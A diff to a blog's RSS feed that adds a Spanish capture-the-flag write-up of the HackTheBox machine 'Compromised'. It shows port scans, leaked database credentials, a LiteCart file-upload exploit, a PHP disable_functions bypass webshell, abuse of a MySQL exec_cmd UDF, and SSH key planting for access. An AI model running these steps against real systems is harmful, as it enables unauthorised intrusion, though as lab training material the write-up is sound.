@@ -5,9 +5,574 @@
     <description>Articulos, Writeups, Htb, Programación y Noticias sobre Ciberseguridad</description>
     <link>http://localhost:4000/</link>
     <atom:link href="http://localhost:4000/feed.xml" rel="self" type="application/rss+xml"/>
-    <pubDate>Mon, 12 Jun 2023 23:50:31 +0000</pubDate>
-    <lastBuildDate>Mon, 12 Jun 2023 23:50:31 +0000</lastBuildDate>
+    <pubDate>Tue, 13 Jun 2023 18:54:56 +0000</pubDate>
+    <lastBuildDate>Tue, 13 Jun 2023 18:54:56 +0000</lastBuildDate>
     <generator>Jekyll v3.9.0</generator>
+    
+      <item>
+        <title>Maquina Compromised - htb writeup</title>
+        <description>&lt;p&gt;Hoy vamos a resolver la máquina &lt;code&gt;Compromised&lt;/code&gt; de la plataforma de &lt;code&gt;hackthebox&lt;/code&gt; correspondiente a una &lt;code&gt;linux&lt;/code&gt; dificultad hard, la cual va a ser explotada , aprovechando información leakeada de credenciales y utilizando un exploit correspondiente a &lt;code&gt;litercart&lt;/code&gt; que conjunto al crearnos una función propia en &lt;code&gt;php&lt;/code&gt; que nos derive en la ejecución de comandos, despues aprovecharemos el concepto de &lt;code&gt;UDF&lt;/code&gt; en mysql, para poder ejecutar una función personalisada que nos permita ganar acceso al sistema, donde obtendremos credenciales validas de un archivo log y finalmente a partir del analisis de un &lt;code&gt;rootkit&lt;/code&gt; ganar tener acceso al sistema como el usuario privilegiado &lt;code&gt;rooot&lt;/code&gt;.&lt;/p&gt;
+
+&lt;p&gt;Vamos a comenzar creando un directorio con el nombre de la maquina:&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;❯ mkdir Compromissed
+❯ ls
+ Compromissed
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;Seguidamente con la funcion mkt crearemos nuestros directorios de trabajo:&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;❯ which mkt
+mkt () {
+	mkdir {nmap,content,exploits,scripts}
+}
+❯ mkt
+❯ ls
+ content   exploits   nmap   scripts
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;h2 id=&quot;enumeracion&quot;&gt;Enumeración &lt;a href=&quot;#enumeracion&quot;&gt;#&lt;/a&gt;&lt;/h2&gt;
+
+&lt;p&gt;Ahora que tenemos nuestros directorios vamos a comenzar con la fase de Enumeracion, empezamos mandando una traza a la ip de la maquina victima con el comando &lt;code&gt;ping&lt;/code&gt;:&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;❯ ping -c 1 10.10.10.207
+PING 10.10.10.207 (10.10.10.207) 56(84) bytes of data.
+64 bytes from 10.10.10.207: icmp_seq=1 ttl=63 time=207 ms
+
+--- 10.10.10.207 ping statistics ---
+1 packets transmitted, 1 received, 0% packet loss, time 0ms
+rtt min/avg/max/mdev = 206.547/206.547/206.547/0.000 ms
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;Vemos que la maquina nos responde, ahora procederemos a el escaneo de puertos con la ayuda de &lt;code&gt;nmap&lt;/code&gt;:&lt;/p&gt;
+
+&lt;h3 id=&quot;escaneo-de-puertos&quot;&gt;Escaneo de Puertos&lt;/h3&gt;
+
+&lt;table&gt;
+  &lt;thead&gt;
+    &lt;tr&gt;
+      &lt;th&gt;Parámetro&lt;/th&gt;
+      &lt;th style=&quot;text-align: left&quot;&gt;Descripción&lt;/th&gt;
+    &lt;/tr&gt;
+  &lt;/thead&gt;
+  &lt;tbody&gt;
+    &lt;tr&gt;
+      &lt;td&gt;&lt;a href=&quot;#enumeracion&quot;&gt;-p-&lt;/a&gt;&lt;/td&gt;
+      &lt;td style=&quot;text-align: left&quot;&gt;Escaneamos todos los 65535 puertos.&lt;/td&gt;
+    &lt;/tr&gt;
+    &lt;tr&gt;
+      &lt;td&gt;&lt;a href=&quot;#enumeracion&quot;&gt;–open&lt;/a&gt;&lt;/td&gt;
+      &lt;td style=&quot;text-align: left&quot;&gt;Solo los puertos que estén abiertos.&lt;/td&gt;
+    &lt;/tr&gt;
+    &lt;tr&gt;
+      &lt;td&gt;&lt;a href=&quot;#enumeracion&quot;&gt;-v&lt;/a&gt;&lt;/td&gt;
+      &lt;td style=&quot;text-align: left&quot;&gt;Permite ver en consola lo que va encontrando (verbose).&lt;/td&gt;
+    &lt;/tr&gt;
+    &lt;tr&gt;
+      &lt;td&gt;&lt;a href=&quot;#enumeracion&quot;&gt;-oG&lt;/a&gt;&lt;/td&gt;
+      &lt;td style=&quot;text-align: left&quot;&gt;Guarda el output en un archivo con formato grepeable para que mediante una funcion de &lt;a href=&quot;https://s4vitar.github.io/&quot;&gt;S4vitar&lt;/a&gt; nos va a permitir extraer cada uno de los puertos y copiarlos sin importar la cantidad en la clipboard y asi al hacer ctrl_c esten disponibles&lt;/td&gt;
+    &lt;/tr&gt;
+  &lt;/tbody&gt;
+&lt;/table&gt;
+
+&lt;p&gt;Procedemos a escanear los puertos abiertos y lo exportaremos al archivo de nombre &lt;code&gt;allPorts&lt;/code&gt;:&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&quot;language-java&quot;&gt;❯ nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn 10.10.10.207 -oG openPorts
+Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times may be slower.
+Starting Nmap 7.92 ( https://nmap.org ) at 2023-06-13 15:35 GMT
+Initiating SYN Stealth Scan at 15:35
+Scanning 10.10.10.207 [65535 ports]
+Discovered open port 80/tcp on 10.10.10.207
+Discovered open port 22/tcp on 10.10.10.207
+Completed SYN Stealth Scan at 15:35, 26.53s elapsed (65535 total ports)
+Nmap scan report for 10.10.10.207
+Host is up, received user-set (0.13s latency).
+Scanned at 2023-06-13 15:35:29 GMT for 26s
+Not shown: 65533 filtered tcp ports (no-response)
+Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
+PORT   STATE SERVICE REASON
+22/tcp open  ssh     syn-ack ttl 63
+80/tcp open  http    syn-ack ttl 63
+
+Read data files from: /usr/bin/../share/nmap
+Nmap done: 1 IP address (1 host up) scanned in 26.65 seconds
+           Raw packets sent: 131087 (5.768MB) | Rcvd: 22 (968B)
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;Podemos ver que los puertos que se encuentran abiertos son el puerto &lt;code&gt;22 ssh&lt;/code&gt; y el &lt;code&gt;80 http&lt;/code&gt;.&lt;/p&gt;
+
+&lt;h3 id=&quot;escaneo-de-version-y-servicios&quot;&gt;Escaneo de Version y Servicios.&lt;/h3&gt;
+
+&lt;pre&gt;&lt;code class=&quot;language-java&quot;&gt;❯ nmap -sCV -p22,80 10.10.10.207 -oN targeted
+Starting Nmap 7.92 ( https://nmap.org ) at 2023-06-13 15:36 GMT
+Nmap scan report for 10.10.10.207
+Host is up (0.21s latency).
+
+PORT   STATE SERVICE VERSION
+22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey: 
+|   2048 6e:da:5c:8e:8e:fb:8e:75:27:4a:b9:2a:59:cd:4b:cb (RSA)
+|   256 d5:c5:b3:0d:c8:b6:69:e4:fb:13:a3:81:4a:15:16:d2 (ECDSA)
+|_  256 35:6a:ee:af:dc:f8:5e:67:0d:bb:f3:ab:18:64:47:90 (ED25519)
+80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
+| http-title: Legitimate Rubber Ducks | Online Store
+|_Requested resource was http://10.10.10.207/shop/en/
+|_http-server-header: Apache/2.4.29 (Ubuntu)
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 19.60 seconds
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;Visulizamos informacion interesante de los puertos escaneados:&lt;/p&gt;
+
+&lt;table&gt;
+  &lt;thead&gt;
+    &lt;tr&gt;
+      &lt;th&gt;Puerto&lt;/th&gt;
+      &lt;th&gt;Servicio&lt;/th&gt;
+      &lt;th&gt;Versión&lt;/th&gt;
+    &lt;/tr&gt;
+  &lt;/thead&gt;
+  &lt;tbody&gt;
+    &lt;tr&gt;
+      &lt;td&gt;22&lt;/td&gt;
+      &lt;td&gt;SSH&lt;/td&gt;
+      &lt;td&gt;OpenSSH 7.6p1 Ubuntu 4ubuntu0.3&lt;/td&gt;
+    &lt;/tr&gt;
+    &lt;tr&gt;
+      &lt;td&gt;80&lt;/td&gt;
+      &lt;td&gt;HTTP&lt;/td&gt;
+      &lt;td&gt;Apache httpd 2.4.29&lt;/td&gt;
+    &lt;/tr&gt;
+  &lt;/tbody&gt;
+&lt;/table&gt;
+
+&lt;p&gt;Seguidamente vamos a usar la herramienta &lt;code&gt;whatweb&lt;/code&gt; para ver por consola el gestor de contenido de la pagina web.&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;❯ whatweb http://10.10.10.207
+http://10.10.10.207 [302 Found] Apache[2.4.29], Country[RESERVED][ZZ], HTTPServer[Ubuntu Linux][Apache/2.4.29 (Ubuntu)], IP[10.10.10.207], RedirectLocation[/shop]
+http://10.10.10.207/shop [301 Moved Permanently] Apache[2.4.29], Country[RESERVED][ZZ], HTTPServer[Ubuntu Linux][Apache/2.4.29 (Ubuntu)], IP[10.10.10.207], RedirectLocation[http://10.10.10.207/shop/], Title[301 Moved Permanently]
+http://10.10.10.207/shop/ [302 Found] Apache[2.4.29], Content-Language[en], Cookies[LCSESSID,cart[uid],currency_code,language_code], Country[RESERVED][ZZ], HTTPServer[Ubuntu Linux][Apache/2.4.29 (Ubuntu)], IP[10.10.10.207], RedirectLocation[http://10.10.10.207/shop/en/], X-Powered-By[LiteCart]
+http://10.10.10.207/shop/en/ [200 OK] Apache[2.4.29], Content-Language[en], Cookies[LCSESSID,cart[uid],currency_code,language_code], Country[RESERVED][ZZ], Email[admin@compromised.htb], HTML5, HTTPServer[Ubuntu Linux][Apache/2.4.29 (Ubuntu)], IP[10.10.10.207], JQuery[3.3.1], Open-Graph-Protocol[website], PasswordField[password], Script, Title[Legitimate Rubber Ducks | Online Store], X-Powered-By[LiteCart]
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;La herramienta nos reporta bastante información la cual incluye rutas, usuaruos y dominios, vamos a proceder a abrir la web en el navegador. Vemos que el servicio corresponde a &lt;code&gt;Litecart&lt;/code&gt;.&lt;/p&gt;
+
+&lt;blockquote&gt;
+  &lt;p&gt;LiteCart es una plataforma de comercio electrónico gratuita fundada por el desarrollador web sueco T. Almroth. LiteCart está inspirado en lo mejor de los mundos y lo que podría haberse hecho mejor en soluciones alternativas de comercio electrónico.&lt;/p&gt;
+&lt;/blockquote&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/images/HTB/htb-writeup-Compromissed/compro1.PNG&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;h2 id=&quot;explotación&quot;&gt;Explotación &lt;a href=&quot;#explotación&quot;&gt;#&lt;/a&gt;&lt;/h2&gt;
+
+&lt;p&gt;Vamos a comenzar descubriendo rutas en la web, para ello primero usaremos unos de los scripts de nmap &lt;code&gt;http-enum&lt;/code&gt;.&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;❯ nmap --script http-enum -p80 10.10.10.207 -oN webScan
+Starting Nmap 7.92 ( https://nmap.org ) at 2023-06-13 15:42 GMT
+Nmap scan report for 10.10.10.207
+Host is up (0.22s latency).
+
+PORT   STATE SERVICE
+80/tcp open  http
+| http-enum: 
+|_  /backup/: Backup folder w/ directory listing
+
+Nmap done: 1 IP address (1 host up) scanned in 32.04 seconds
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;Descubirmos una ruta valida que dentro tiene un archivo comprimido que procederemos a traer y descomprimir en nuestra maquina.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/images/HTB/htb-writeup-Compromissed/compro2.PNG&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Una vez lo descomprimimos en nuestra maquina, podemos ver un directorio de nombre &lt;code&gt;shop&lt;/code&gt; el cual incluye a su vez varios directorios y archivos, en los cuale&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;❯ cd shop
+❯ ls
+ admin   cache   data   ext   images   includes   logs   pages   vqmod   favicon.ico   index.php  ﮧ robots.txt
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;Una vez dentro vamos a tratar de buscar credenciales, filtrando por archivos de configuración con la siguiente expresion:&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;❯ find . -name \*config\* | xargs cat | grep -iE &quot;user|pass|key&quot;
+    'name' =&amp;gt; language::translate('title_users', 'Users'),
+    'default' =&amp;gt; 'users',
+      'users' =&amp;gt; 'users.inc.php',
+      'edit_user' =&amp;gt; 'edit_user.inc.php',
+    order by priority, `key`;&quot;
+      'title' =&amp;gt; language::translate('settings_group:title_'.$group['key'], $group['name']),
+      'doc' =&amp;gt; $group['key'],
+    $app_config['docs'][$group['key']] = 'settings.inc.php';
+      'icon' =&amp;gt; 'fa-user',
+      'key' =&amp;gt; 'product_modal_window',
+      'key' =&amp;gt; 'sidebar_parallax_effect',
+      'key' =&amp;gt; 'compact_category_tree',
+      'key' =&amp;gt; 'cookie_acceptance',
+  define('DB_USERNAME', 'root');
+  define('DB_PASSWORD', 'changethis');
+  define('DB_TABLE_USERS',                             '`'. DB_DATABASE .'`.`'. DB_TABLE_PREFIX . 'users`');
+ Password Encryption Salt
+  define('PASSWORD_SALT', 'kg1T5n2bOEgF8tXIdMnmkcDUgDqOLVvACBuYGGpaFkOeMrFkK0BorssylqdAP48Fzbe8ylLUx626IWBGJ00ZQfOTgPnoxue1vnCN1amGRZHATcRXjoc6HiXw0uXYD9mI');
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;Obtenemos unas credenciales correspondientes a la base de datos &lt;code&gt;root: changethis&lt;/code&gt; que procederemos a almancenar.&lt;/p&gt;
+
+&lt;p&gt;Ahora podemos ver qu dentro del directorio &lt;code&gt;admin&lt;/code&gt;, vemos un archivo de nombre &lt;code&gt;login.php&lt;/code&gt;, validamos si existe una ruta correspondiente en la web y efectivamente existe.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/images/HTB/htb-writeup-Compromissed/compro3.PNG&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;despues al leer el archivo &lt;code&gt;login.php&lt;/code&gt;, podemos ver que comentada una ruta oculta con un archivo txt.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/images/HTB/htb-writeup-Compromissed/compro4.PNG&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Al validar la ruta obtenemos nuevas credenciales.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/images/HTB/htb-writeup-Compromissed/compro5.PNG&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Validamos las credenciales y nos conectamos al servicio.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/images/HTB/htb-writeup-Compromissed/compro6.PNG&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Ahora vamos a buscar si existen vulnerabilidades asociadas a &lt;code&gt;litecart&lt;/code&gt; y vemos que existe un exploit en python2.&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;❯ searchsploit litecart
+----------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
+ Exploit Title                                                                                                                                       |  Path
+----------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
+LiteCart 2.1.2 - Arbitrary File Upload                                                                                                               | php/webapps/45267.py
+----------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
+Shellcodes: No Results
+Papers: No Results
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;Nos traemos el exploit y lo ejecutamos con los parametros especificos&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;❯ python2 litecart.py -t http://10.10.10.207/shop/admin/ -u 'admin' -p 'theNextGenSt0r3!~'
+Shell =&amp;gt; http://10.10.10.207/shop/admin/../vqmod/xml/D5B8I.php?c=id
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;validamos en la web el enlace generado pero vemos que no funciona, seguidamente vamos a modificar el exploit cambiando el nombre aleatorio que nis genera por uno estatico de nombre &lt;code&gt;shell.php&lt;/code&gt; y ejecutaremos dentro del arhivo &lt;code&gt;phpinfo()&lt;/code&gt; para ver las funciones que estan desabilitadas.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/images/HTB/htb-writeup-Compromissed/compro7.PNG&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Volvemos a ejecutar nuevamente el exploit.&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;❯ python2 litecart.py -t http://10.10.10.207/shop/admin/ -u 'admin' -p 'theNextGenSt0r3!~'
+Shell =&amp;gt; http://10.10.10.207/shop/admin/../vqmod/xml/shell.php
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;Vamos al enlace generado y vemos la lista funciones desabilitadas, y vemos que que por ello nuestro exploit no funciona ya que por defecto emplea la función &lt;code&gt;system&lt;/code&gt;.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/images/HTB/htb-writeup-Compromissed/compro8.PNG&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Vemos que estamos muy limitados en cuanto a funciones, pero debemos recordar que podemos crear nuestra propia función que nos permita ejecutar comandos a nivel de sistema. Para ello existe una utilidad de la cual nos podemos apoyar.&lt;/p&gt;
+
+&lt;p&gt;&lt;a href=&quot;https://packetstormsecurity.com/files/154728/PHP-7.3-disable_functions-Bypass.html&quot;&gt;https://packetstormsecurity.com/files/154728/PHP-7.3-disable_functions-Bypass.html&lt;/a&gt;&lt;/p&gt;
+
+&lt;p&gt;Para ello primero debemos crearnos un archivo con el contenido que nos proporcionan, en este casollamere al archivo &lt;code&gt;funct.php&lt;/code&gt;. Dentro lo que hace el codigo es crear una función con el nombre &lt;code&gt;pwn&lt;/code&gt;, pero puedes llamar a la función como quieras y tambien define un parametro el cual establecere con &lt;code&gt;$_REQUEST['cmd]&lt;/code&gt;, para que atravez de &lt;code&gt;cmd&lt;/code&gt; pueda ejecutar instrucciones.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/images/HTB/htb-writeup-Compromissed/compro9.PNG&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Ahora modificaremos el exploit &lt;code&gt;litercart&lt;/code&gt;, para que nos suba el contenido de la nueva función creada &lt;code&gt;funct.php&lt;/code&gt;&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/images/HTB/htb-writeup-Compromissed/compro10.PNG&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Ejecutamos el exploit, vamos al enlance y esta vez podemos ejecutar comandos.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/images/HTB/htb-writeup-Compromissed/compro11.PNG&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Ahora si queremos mandarnos una revershell, vemos que no tenemos conexión.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/images/HTB/htb-writeup-Compromissed/compro12.PNG&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Para simular una &lt;code&gt;tty&lt;/code&gt; utilizaremos la herramienta &lt;code&gt;tty_over_http&lt;/code&gt; de s4vitar.&lt;/p&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;&lt;a href=&quot;https://github.com/s4vitar/ttyoverhttp&quot;&gt;https://github.com/s4vitar/ttyoverhttp&lt;/a&gt;&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;p&gt;El uso es simple solo debemos ingresar la url de nuestra shell en la solicitud &lt;code&gt;requests&lt;/code&gt;&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/images/HTB/htb-writeup-Compromissed/compro13.PNG&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;De esta forma podemos movernos mas comodamente desde consola, adicionalemente vamos a otorgarnos un aconsola.&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&quot;language-python&quot;&gt;❯ python3 tty_over_http.py
+&amp;gt; whoami
+&amp;gt; www-data
+ls
+&amp;gt; D5B8I.php
+fmiracle.php
+index.html
+shell.php
+python3 -c 'import pty;pty.spawn(&quot;/bin/bash&quot;)'
+&amp;gt; www-data@compromised:/var/www/html/shop$
+ls
+&amp;gt; ls
+admin  data  favicon.ico  includes   logs   robots.txt
+cache  ext   images	 index.php  pages  vqmod
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;Recordemos que anteriormente obtuvimos credenciales de la base de datos &lt;code&gt;root:changethis&lt;/code&gt;&lt;/p&gt;
+
+&lt;p&gt;Validamos las credenciales y procedemos a enumerar la base de datos, enumerando la base de datos, encontramos un usuario y un hash, pero no conseguimos romper el hash.&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&quot;language-sql&quot;&gt;www-data@compromised:/var/www/html/shop$
+ mysql -uroot -pchangethis -e &quot;select username, password from lc_users;&quot; ecom
+&amp;lt; -e &quot;select username, password from lc_users;&quot; ecom
+mysql: [Warning] Using a password on the command line interface can be insecure.
++----------+------------------------------------------------------------------+
+| username | password                                                         |
++----------+------------------------------------------------------------------+
+| admin    | 44c79f6669819c0185822c587597b46c98c3cff90512318cb84d8e7c190de8b4 |
++----------+------------------------------------------------------------------+
+www-data@compromised:/var/www/html/shop$
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;Al seguir enumerando el sistema, vemos que existe un usuario &lt;code&gt;mysql&lt;/code&gt;, el cual tiene asignada una bash.&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;&amp;gt; cat /etc/passwd
+root:x:0:0:root:/root:/bin/bash
+daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
+bin:x:2:2:bin:/bin:/usr/sbin/nologin
+sys:x:3:3:sys:/dev:/usr/sbin/nologin
+sync:x:4:65534:sync:/bin:/bin/sync
+games:x:5:60:games:/usr/games:/usr/sbin/nologin
+man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
+lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
+mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
+news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
+uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
+proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
+www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
+backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
+list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
+irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
+gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
+nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
+systemd-network:x:100:102:systemd Network Management,,,:/run/systemd/netif:/usr/sbin/nologin
+systemd-resolve:x:101:103:systemd Resolver,,,:/run/systemd/resolve:/usr/sbin/nologin
+syslog:x:102:106::/home/syslog:/usr/sbin/nologin
+messagebus:x:103:107::/nonexistent:/usr/sbin/nologin
+_apt:x:104:65534::/nonexistent:/usr/sbin/nologin
+lxd:x:105:65534::/var/lib/lxd/:/bin/false
+uuidd:x:106:110::/run/uuidd:/usr/sbin/nologin
+dnsmasq:x:107:65534:dnsmasq,,,:/var/lib/misc:/usr/sbin/nologin
+landscape:x:108:112::/var/lib/landscape:/usr/sbin/nologin
+pollinate:x:109:1::/var/cache/pollinate:/bin/false
+sshd:x:110:65534::/run/sshd:/usr/sbin/nologin
+sysadmin:x:1000:1000:compromise:/home/sysadmin:/bin/bash
+mysql:x:111:113:MySQL Server,,,:/var/lib/mysql:/bin/bash
+red:x:1001:1001::/home/red:/bin/false
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;Como el usuario &lt;code&gt;mysql&lt;/code&gt; tiene una bash podria estar relacionado a los &lt;code&gt;UDF&lt;/code&gt;, que nos permiten definir funciones especificas.&lt;/p&gt;
+
+&lt;blockquote&gt;
+  &lt;p&gt;UDF: una Función Definida por el Usuario (UDF) es un trozo de código que extiende la funcionalidad de un servidor MySQL añadiendo una nueva función que se comporta igual que una función nativa (incorporada) de MySQL, como abs() o concat().&lt;/p&gt;
+&lt;/blockquote&gt;
+
+&lt;p&gt;Para poder listar estas funciones, haciendo uso de la mismas credenciales de la base de datos, podemos hacerlo ejecutando:&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&quot;language-sql&quot;&gt;mysql -uroot -pchangethis -e &quot;select * from mysql.func&quot;
+&amp;lt;l -uroot -pchangethis -e &quot;select * from mysql.func&quot;
+mysql: [Warning] Using a password on the command line interface can be insecure.
++----------+-----+-------------+----------+
+| name     | ret | dl          | type     |
++----------+-----+-------------+----------+
+| exec_cmd |   0 | libmysql.so | function |
++----------+-----+-------------+----------+
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;vemos que existe una función definida de nombre &lt;code&gt;exec_cmd&lt;/code&gt;, que al ejecutar un comando nos lo realiza exitosamente.&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&quot;language-sql&quot;&gt;mysql -uroot -pchangethis -e &quot;select exec_cmd('pwd');&quot;
+&amp;lt;ql -uroot -pchangethis -e &quot;select exec_cmd('pwd');&quot;
+mysql: [Warning] Using a password on the command line interface can be insecure.
++------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------+
+| exec_cmd('pwd')                                                                                                                                                                                                                                                                                                     |
++------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------+
+| /var/lib/mysql
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;No podemos entablarnos una reverse shell, pero recordemos que el puerto &lt;code&gt;22&lt;/code&gt; esta abierto, asi que podriamos usar los principios basicos de claves ssh, para introducir nuestra clave publica en el directorio del usuario como &lt;code&gt;authorized_keys&lt;/code&gt;&lt;/p&gt;
+
+&lt;p&gt;Creamos el directorio &lt;code&gt;.ssh&lt;/code&gt;&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&quot;language-sql&quot;&gt;mysql -uroot -pchangethis -e &quot;select exec_cmd('mkdir /var/lib/mysql/.ssh/');&quot;
+&amp;lt;-e &quot;select exec_cmd('mkdir /var/lib/mysql/.ssh/');&quot;
+mysql: [Warning] Using a password on the command line interface can be insecure.
++------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------+
+| exec_cmd('mkdir /var/lib/mysql/.ssh/')                                 
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;Introducimos nuestra clave privada, renombrandola como &lt;code&gt;authorized_keys&lt;/code&gt;&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&quot;language-sql&quot;&gt;mysql -uroot -pchangethis -e &quot;select exec_cmd('echo ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDSSuSh/zi5KspA8ZYqWIxduahcDanjzfout7+OVdf5zD6rme/9U0gKI5qKUV+aPk2KwyRK0se06hdubAKQJ0xNciuPoOMSiN8UqbikaxxUNNq2wUBdzGEQ93gFzpHD1VJ+LHGyJJO82x/awHBT9d7m1lgqPxuIPKC/CZWMR/8CLuC649eSaoJ5HaxeMDHNNmKu511aZUxCetjVhQxRdI3unUz7h+Bg0x64v9HYC1oOcilMJAdOXNsIJLDpeDajnz/bYjVjqx1fe4ztyhneoMF1/h4xc0165Vb2YT5AezAOuY+yZlRjkKlYuuvxGulZ1P72Pc1hO/4p3/waHz53JwfrlKtGzo0Vq2H+ajXXmNKhPbv5g531F0j75DYTMXs/oQFntvcqxXQCqqBmKsY0Gf4yy3M5D/KNOW4Z8Naeauu+XFHfqd/jTzaXck24XFYfZj1VAdn7XqD30Q3QIhESWj5i3n9E7kohx5PhgU7OB5u6K4YPVXjjOQ30iwWGQcnYAeU= root@hack4u &amp;gt; /var/lib/mysql/.ssh/authorized_keys');&quot;
+&amp;lt;ot@hack4u &amp;gt; /var/lib/mysql/.ssh/authorized_keys');&quot;
+mysql: [Warning] Using a password on the command line interface can be insecure.
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;❯ ssh mysql@10.10.10.207
+Last login: Thu Sep  3 11:52:44 2020 from 10.10.14.2
+mysql@compromised:~$ whoami
+mysql
+&lt;/code&gt;&lt;/pre&gt;
+
